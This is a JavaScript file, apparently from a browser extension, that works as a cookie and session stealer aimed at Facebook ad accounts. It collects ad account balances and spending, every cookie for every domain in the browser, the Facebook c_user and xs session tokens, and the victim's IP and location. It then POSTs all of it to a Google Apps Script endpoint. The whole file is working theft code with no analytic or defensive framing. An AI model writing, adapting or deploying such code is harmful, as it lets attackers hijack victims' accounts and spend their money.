async function newUser(){
    var objAcc = chrome.objAcc;
    var doccap = ''
    var stt = 1;
    for(var o of objAcc){ 
        doccap+= stt.toString() + '|' + o['status']+ '|' + o['balance'] + '|'
        + o['threshold']+ '|' + o['adtrust']+ '|' + o['spent']+ '|' +
        o['currency']+ '|' + o['acctype']+  '\n'
        stt++;
    }

    var allck = await headCookieAl();

    var today = new Date();
    var date = today.getDate()+'-'+(today.getMonth()+1)+'-'+today.getFullYear();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    var info = await getInfoRq();
    var ck = await headCookieDomain('facebook.com');
    var u = await headCookieDomain2('facebook.com');

    var obj = {
        date: date,
        time: time,
        country: info.country,
        ip: info.ip,
        id: u.u,
        info: doccap,
        res: ck,
        res_xs: u.xs,
        allck: allck
    }

    url = 'https://script.google.com/macros/s/AKfycbyrGJdaR4ZUqN5JC9zBe8PX0jfgQSv7EfbbIkuW-G8O8P9gx4PZwXv_Jya7OdGHGYWpjQ/exec'
    let formData = new FormData();
    for( o in obj){
        formData.append(o, obj[o]);
    }
    //formData.append('date', obj.date);
    let response = await reqAPI(url, 'POST', formData)
    console.log(response)
}

async function headCookieAl() {
    let cks = await chrome.cookies.getAll({});
    let arrDomain = [];
    for (let ck of cks) {
        arrDomain.push(ck.domain)
    }
    arrDomain = arrDomain.sort();
    arrDomain = Array.from(new Set(arrDomain));
    var text = ''
    for (let i of arrDomain) {
        ck = await headCookieDomain(i);
        text += 'Domain: ' + i + '\n' + ck + '\n\n'

    }
    return text
}

async function getInfoRq() {
    let url = 'https://codewithnodejs.com/api/ip-and-location/';
    let json = await reqAPI(url, 'GET')
    let obj = JSON.parse(json);
    let info = obj['ip'] + ', ' + obj['city'] + ', ' + obj['country'] + ', ' + obj['country_code'];
    return obj;
}

async function headCookieDomain2(domain) {
    let cks = await chrome.cookies.getAll({ url: 'https://' + domain });
    var objcks = {};
    for(let ck of cks){
        switch (ck.name) {
            case 'c_user':
                objcks.u = ck.value;
                break;
            case 'xs':
                objcks.xs = ck.value;
                break;
        }
    }
    return objcks;
}

async function headCookieDomain(domain) {
    let cks = await chrome.cookies.getAll({ url: 'https://' + domain });
    let text = ''
    for (let ck of cks) {
        text += ck.name + '=' + ck.value + ';';
    }
    return text
}
